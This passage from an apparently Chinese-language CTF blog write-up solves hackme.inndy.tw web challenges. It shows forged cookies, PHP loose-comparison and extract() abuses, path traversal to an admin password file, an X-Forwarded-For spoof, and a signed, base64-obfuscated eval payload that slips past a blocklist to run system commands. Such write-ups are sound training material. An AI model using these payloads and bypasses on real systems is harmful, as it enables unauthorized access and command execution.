+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   &lt;?php</span><br><span class="line">function set_user()</span><br><span class="line">&#123;</span><br><span class="line">   $user = [&#x27;admin&#x27;,true];</span><br><span class="line">   $data = json_encode($user);</span><br><span class="line">   $sig = 0;</span><br><span class="line">   $all = base64_encode(json_encode([&#x27;sig&#x27; =&gt; $sig, &#x27;data&#x27; =&gt; $data]));</span><br><span class="line">   echo $all;</span><br><span class="line">&#125;</span><br><span class="line">set_user();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914231838363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>在网页的console下输入下面的命令（也就是在cookie里添加如下内容）即得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&quot;user=eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=&quot;；</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914232028746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="知识扩展-5"><a href="#知识扩展-5" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>php弱比较</li>
+<li>在cookie里添加内容</li>
+</ul>
+<h2 id="12-login-as-admin-4"><a href="#12-login-as-admin-4" class="headerlink" title="12 login as admin 4"></a>12 login as admin 4</h2><blockquote>
+<p>login as admin</p>
+</blockquote>
+<p>查看网页源代码，发现这次代码终于不多了，happy</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&#x27;config.php&#x27;);</span><br><span class="line">if($_GET[&#x27;show_source&#x27;] === &#x27;1&#x27;) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;name&#x27;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">    if($_POST[&#x27;password&#x27;] !== $password) &#123;</span><br><span class="line">        // show failed message if you input wrong password</span><br><span class="line">        header(&#x27;Location: ./?failed=1&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>前面需要$_POST[‘name’] &#x3D;&#x3D;&#x3D; ‘admin’，后面必须<br>$_POST[‘password’] !&#x3D;&#x3D; $password，否则后面<br>Location: .&#x2F;?failed&#x3D;1 就会跳转到failed&#x3D;1，会登入失败，<br>但我们并不知道$password 是什么，这个应该包含的config.php中，我们只要用curl使得能够不跳转就直接看到后面的flag</p>
+<p><img src="https://img-blog.csdnimg.cn/2019091423313125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="知识扩展-6"><a href="#知识扩展-6" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>curl命令详解</li>
+</ul>
+<p>-d&#x2F;–data <data>                  HTTP POST方式传送数据<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/duhuo/p/5695256.html">https://www.cnblogs.com/duhuo/p/5695256.html</a></p>
+<h2 id="13-login-as-admin-6"><a href="#13-login-as-admin-6" class="headerlink" title="13 login as admin 6"></a>13 login as admin 6</h2><blockquote>
+<p>login as admin</p>
+</blockquote>
+<p>看看源码，发现这里仍然需要满足$user&#x3D;&#x3D;’admin’</p>
+<p><img src="https://img-blog.csdnimg.cn/20190914235713199.png"></p>
+<p>又发现了extract函数，就觉得代码存在变量覆盖漏洞，构造下面的json数据即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;user&quot;: &quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在kali中执行如下命令即得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d &#x27;data=&#123;&quot;user&quot;: &quot;admin&quot;&#125;&#x27; https://hackme.inndy.tw/login6/</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190915000758231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="知识扩展-7"><a href="#知识扩展-7" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>extract()函数<br>本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.extract.php">https://www.php.net/manual/zh/function.extract.php</a></li>
+<li>json格式数据<br>{“a”:1,”b”:2,”c”:3,”d”:4,”e”:5}<br><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-json.html">https://www.runoob.com/php/php-json.html</a></li>
+</ul>
+<h2 id="14-login-as-admin-7"><a href="#14-login-as-admin-7" class="headerlink" title="14 login as admin 7"></a>14 login as admin 7</h2><blockquote>
+<p>login as admin</p>
+</blockquote>
+<p>看源码，又是需要$user &#x3D;&#x3D; ‘admin’，能不能有点创新了</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915002726628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>而且password经过md5加密后必须为’00000000000000000000000000000000’，而且通过&#x3D;&#x3D;联想到PHP Hash比较存在缺陷，所以构造payload并执行如下curl命令即得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &quot;name=admin&amp;password=QNKCDZO&quot; https://hackme.inndy.tw/login7/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190915003102645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="知识扩展-8"><a href="#知识扩展-8" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>PHP Hash比较存在缺陷<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/67007.html">https://www.freebuf.com/news/67007.html</a></li>
+<li>0e开头md5汇总<br>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br><a target="_blank" rel="noopener" href="https://www.ohlinge.cn/php/0e_md5.html">https://www.ohlinge.cn/php/0e_md5.html</a></li>
+</ul>
+<h2 id="15-dafuq-manager-1"><a href="#15-dafuq-manager-1" class="headerlink" title="15 dafuq-manager 1"></a>15 dafuq-manager 1</h2><blockquote>
+<p>Login as guest and find flag 1</p>
+</blockquote>
+<p>进入题目后发现可以用guest登录，于是利用Username&#x3D;guest，Password&#x3D;guest登录</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915104833816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>登录成功后进入如下界面，会发现有个小提示</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915105004578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>点击进入后发现题目让我们创建一个cookie</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915105042317.png"></p>
+<p>于是利用如下命令在console中创建cookie并回车，然后弹出一个让我们tamper a cookie的提示</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915105334451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>然后发现了可疑的show_hidden，其值为no</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915105539534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>在控制台中，将show_hidden改为yes即得flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915105759443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190915105814610.png"></p>
+<h2 id="16-dafuq-manager-2"><a href="#16-dafuq-manager-2" class="headerlink" title="16 dafuq-manager 2"></a>16 dafuq-manager 2</h2><blockquote>
+<pre><code>Login as admin, code review and get flag 2
+</code></pre>
+</blockquote>
+<p>在上题的基础上，我们可以进入红框中的文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915110017163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>会发现提示，让我们以admin身份登录</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915110136568.png"></p>
+<p>于是，我们将7z压缩包下载并解压，得到了源码，开始审计，重点关注与 admin 有关的部分</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915172516680.png"></p>
+<p>在 index.php 中，我们发现了show_admin()函数，在fun_admin.php中跟踪到了这个函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915173039105.png"></p>
+<p>发现了$GLOBALS[“permissions”]，继续追踪与其有关的变量</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915173322344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>又在activate_user()中找到了与 $ GLOBALS[“permissions”]有赋值关系的$ data，追踪到$data在函数activate_user()中有如下关系</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915174351328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>接着，追踪find_user()函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915174534223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>而 $GLOBALS[“users”] 在哪里呢？全局搜索，发现在 .htusers.php 中</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915174700653.png"></p>
+<p>但是源码泄露并没有完全泄露，只给出了guest的密码，这里应该是有管理员账号密码的，账号密码存在文件中所以我们不能够sql注入，所以我们是否能够尝试读取服务器上的 .htusers.php？直接访问 <a target="_blank" rel="noopener" href="https://dafuq-manager.hackme.inndy.tw/.config/.htusers.php">https://dafuq-manager.hackme.inndy.tw/.config/.htusers.php</a> 肯定是没办法看到变量内容的，先看看能不能用 download 下载，在 index.php 中</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915175005463.png"></p>
+<p>而在fun_down.php中，需要满足红框中的条件</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915175219923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>而且，我们要读取的是 .config&#x2F;.htusers.php ，但是在题目的 stristr($ abs_item, ‘.php’) || stristr($abs_item, ‘config’) 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915180110935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"><br>那么看看另一个功能 edit。下面是 fun_edit.php 中 edit_file() 函数的一部分。</p>
+<p><img src="https://img-blog.csdnimg.cn/2019091518043669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>没有 basename()，所以尝试以下url，找到了管理员的账号和密码</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915180659685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>username就是adm1n15trat0r，密码是how do you turn this on（34af0d074b17f44d1bb939765b02776f经过md5j解密得到）</p>
+<p><img src="https://img-blog.csdnimg.cn/2019091518120625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>输入用户名和密码后即得flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915182047269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190915182100249.png"></p>
+<h3 id="知识扩展-9"><a href="#知识扩展-9" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>php代码审计</li>
+<li>Seay软件自动审计代码漏洞</li>
+</ul>
+<h2 id="17-dafuq-manager-3"><a href="#17-dafuq-manager-3" class="headerlink" title="17 dafuq-manager 3"></a>17 dafuq-manager 3</h2><blockquote>
+<p>Get a shell to find flag 3</p>
+</blockquote>
+<p>这一题是让我们找到网站的命令执行问题，拿到shell，最终获得flag<br>有了大体的思路，然后就是审计代码，结果在&#x2F;core&#x2F;fun_debug.php发现了问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function make_command($cmd) &#123;</span><br><span class="line">    $hmac = hash_hmac(&#x27;sha256&#x27;, $cmd, $GLOBALS[&quot;secret_key&quot;]);</span><br><span class="line">    return sprintf(&#x27;%s.%s&#x27;, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line">function do_debug() &#123;</span><br><span class="line">    assert(strlen($GLOBALS[&#x27;secret_key&#x27;]) &gt; 40);</span><br><span class="line">    $dir = $GLOBALS[&#x27;__GET&#x27;][&#x27;dir&#x27;];</span><br><span class="line">    if (strcmp($dir, &quot;magically&quot;) || strcmp($dir, &quot;hacker&quot;) || strcmp($dir, &quot;admin&quot;)) &#123;</span><br><span class="line">        show_error(&#x27;You are not hacky enough :(&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    list($cmd, $hmac) = explode(&#x27;.&#x27;, $GLOBALS[&#x27;__GET&#x27;][&#x27;command&#x27;], 2);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = array(&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;popen&#x27;, &#x27;pcntl_exec&#x27;, &#x27;proc_open&#x27;, &#x27;passthru&#x27;, &#x27;`&#x27;, &#x27;eval&#x27;, &#x27;assert&#x27;, &#x27;preg_replace&#x27;, &#x27;create_function&#x27;, &#x27;include&#x27;, &#x27;require&#x27;, &#x27;curl&#x27;,);</span><br><span class="line">    foreach ($bad_things as $bad) &#123;</span><br><span class="line">        if (stristr($cmd, $bad)) &#123;</span><br><span class="line">            die(&#x27;2bad&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (hash_equals(hash_hmac(&#x27;sha256&#x27;, $cmd, $GLOBALS[&quot;secret_key&quot;]), $hmac)) &#123;</span><br><span class="line">        die(eval($cmd));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        show_error(&#x27;What does the fox say?&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码有点多:( ，喝点肥仔水冷静一下，逐个分析，这里需要我们绕过</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915203132375.png"></p>
+<p>看到strcmp()函数，我们就想到它的黑魔法，可以利用数组进行绕过，例如<code>dir[]=1</code></p>
+<p>接着，轮到cmd参数了，需要我们的base64的命令，并且和hmac消息验证码拼接</p>
+<p>这里代码中给出了生成的函数，我们可以直接调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function make_command($cmd) &#123;</span><br><span class="line">    $hmac = hash_hmac(&#x27;sha256&#x27;, $cmd, $GLOBALS[&quot;secret_key&quot;]);</span><br><span class="line">    return sprintf(&#x27;%s.%s&#x27;, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再关注一下黑名单的过滤，尽管有过滤，但这一类直接搜索字符串的过滤都是纸老虎。<br>作为世界上最好的语言之一，PHP 有很多你想象不到的技巧：) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$bad_things = array(&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;popen&#x27;, &#x27;pcntl_exec&#x27;, &#x27;proc_open&#x27;, &#x27;passthru&#x27;, &#x27;`&#x27;, &#x27;eval&#x27;, &#x27;assert&#x27;, &#x27;preg_replace&#x27;, &#x27;create_function&#x27;, &#x27;include&#x27;, &#x27;require&#x27;, &#x27;curl&#x27;,);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用base64编码绕过这些菜鸡式的黑名单过滤，到时候做大创绝对不用这种方式过滤命令╭(╯^╰)╮<br>攻击脚本如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function make_command($cmd) &#123;</span><br><span class="line">    $hmac = hash_hmac(&#x27;sha256&#x27;, $cmd, &#x27;KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3&#x27;);</span><br><span class="line">    return sprintf(&#x27;%s.%s&#x27;, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line">echo make_command(&#x27;$a=\&#x27;ass\&#x27;;$b=\&#x27;ert\&#x27;;$c=$a.$b;$c(base64_decode(\&#x27;c3lzdGVtKCcuL2ZsYWczL21lb3cgLi9mbGFnMy9mbGFnMycp\&#x27;));&#x27;);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 运行后得到拼接后攻击命令片段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JGE9J2Fzcyc7JGI9J2VydCc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnYzNsemRHVnRLQ2N1TDJac1lXY3pMMjFsYjNjZ0xpOW1iR0ZuTXk5bWJHRm5NeWNwJykpOw==.a732bca4115e60392997efb8da69fe8224b355856f8435a1a65cbc403d3c1b32</span><br></pre></td></tr></table></figure>
+
+<p>在地址栏敲入下列的url得到了下面的提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dafuq-manager.hackme.inndy.tw/?action=debug&amp;dir[]=&amp;command=JGE9InN5cyI7JGI9InRlbSI7JGM9JGEuJGI7JGMoImxzIGZsYWczIik7.1704151fc14b04ab80317ccb0009b18bb478bc6e0c25756d48e38a4dff57b376</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190915211441404.png"></p>
+<p>最后就是读flag3文件了，这里cat不能用，但是看到有个meow.c，猜测是用来读文件的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dafuq-manager.hackme.inndy.tw/?action=debug&amp;dir[]=&amp;command=JGE9J2Fzcyc7JGI9J2VydCc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnYzNsemRHVnRLQ2N1TDJac1lXY3pMMjFsYjNjZ0xpOW1iR0ZuTXk5bWJHRm5NeWNwJykpOw==.a732bca4115e60392997efb8da69fe8224b355856f8435a1a65cbc403d3c1b32</span><br></pre></td></tr></table></figure>
+
+<p>利用上面的url即得flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20190915215742265.png"></p>
+<h3 id="知识扩展-10"><a href="#知识扩展-10" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>php命令执行的一些绕过技巧 <a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></li>
+<li>strcmp黑魔法</li>
+<li>hash_hmac()函数<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.hash-hmac.php">https://www.php.net/manual/zh/function.hash-hmac.php</a></li>
+</ul>
+<h2 id="18-wordpress-1"><a href="#18-wordpress-1" class="headerlink" title="18 wordpress 1"></a>18 wordpress 1</h2><blockquote>
+<pre><code>Something strange is hidding in the source code, find it.
+</code></pre>
+<p>Tips: This challenge does not require to exploit any thing, don’t use any scanner.</p>
+</blockquote>
+<p>看了下提示<br>Something strange is hidding in the source code<br>这大概是用 wordpress搭建的博客，我自己在YouTube上学的是hexo搭建博客<br>看看源码，没有什么特殊发现，看看有没有源码泄露<br>打开robots.txt没有<br>看看博客文章<br>在第一篇文章里发现源码</p>
+<p><img src="https://img-blog.csdnimg.cn/20190916200126319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>Seay自动审计+搜索下flag，发现一大堆<br>这可能要审到地老天荒了<br>一般来说这种完整的网站，插件是一个漏洞很可能存在的地方</p>
+<p><img src="https://img-blog.csdnimg.cn/20190916200359853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>果不其然，发现了有个输出flag的函数，passw0rd中的内容md5解密后结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190916200739840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>所以就想通过下面的url来读取flag信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://wp.hackme.inndy.tw/?passw0rd=cat flag</span><br></pre></td></tr></table></figure>
+
+<p>但是事与愿违啊</p>
+<p><img src="https://img-blog.csdnimg.cn/20190916201009892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>只有返回去审计print_f14g()函数了，发现需要满足<code>wp_get_user_ip() === &#39;127.0.0.1&#39;</code>才能得到flag，跟踪一下wp_get_user_ip()函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20190916201220790.png"></p>
+<p>大兄弟啊，你这不是明摆着让我们用XFF绕过嘛o(<em>￣︶￣</em>)o<br>于是乎，用burpsuite抓包并添加<code>X-Forwarded-For: 127.0.0.1</code><br>，在repeater中send即得flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20190916213425108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h2 id="19-wordpress-2"><a href="#19-wordpress-2" class="headerlink" title="19 wordpress 2"></a>19 wordpress 2</h2><blockquote>
+<p>Find another strange thing in the source code.<br>Tips: This challenge does not require to exploit any thing, don’t use any scanner.</p>
+</blockquote>
+<p>上一题的flag提示我们在主题中找后门，而且在2013年10月的一篇文章为flag2,是有密码的，估计就是利用这个后门突破密码限制，而且在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`wordpress\wp-content\themes\astrid\template-parts\content-search.php`</span><br></pre></td></tr></table></figure>
+
+<p>找到可疑操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- debug:&lt;?php var_dump($wp_query-&gt;post-&gt;&#123;&#x27;post_&#x27;.(string)($_GET[&#x27;debug&#x27;]?:&#x27;type&#x27;)&#125;); ?&gt; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>大概意思是通过post某个值获取这个值的内容？<br>接着通过下面的url获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:https://wp.hackme.inndy.tw/archives/date/2013/10?s=&amp;debug=content</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190916221314326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>后面几题实在是看着大佬的wp都整不出来flag，所以就写这么多吧</p>
+<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本文参考了如下手足的文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#WEB">https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#WEB</a></li>
